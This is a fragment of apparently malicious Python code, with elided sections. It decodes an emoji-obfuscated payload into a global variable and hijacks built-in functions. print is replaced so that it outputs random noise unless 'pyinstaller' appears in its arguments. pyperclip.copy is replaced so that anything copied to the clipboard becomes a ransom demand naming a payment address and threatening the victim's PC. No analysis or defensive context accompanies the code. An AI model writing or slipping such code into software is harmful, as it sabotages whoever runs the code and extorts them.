...
c=TokenCryptor()
builtins.bots=c.process("🌻🛡️🌻🌴🌻💀🌿🌺💧🛡️🔮🎳💧🛡️🐬🌽🐉🧠🌍🌽🐉🚀🌼🎳💧🌼♫🍕🐉🏮⚡🔥🎵♫🎵🍉🐉-â🌍🌊🎂🥇🌻🥡🏮🔔🍒🐉🦦🦋💼🔑🎀🐾🧠🎀🍕🚀🌴🏮🎳⌂🐉🧠🐬🌴🍋🪴🐬🛡️🦄")
...
builtins.print = lambda *a, **k: __original_print(''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=600)), **k) if not any("pyinstaller" in str(i) for i in a) else __original_print(*a, **k)
pyperclip.copy = lambda text: __original_copy("PAY 100 USD AT LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB OR YOUR PC WILL BE FUCKED")
@_genericPyAutoGUIChecks
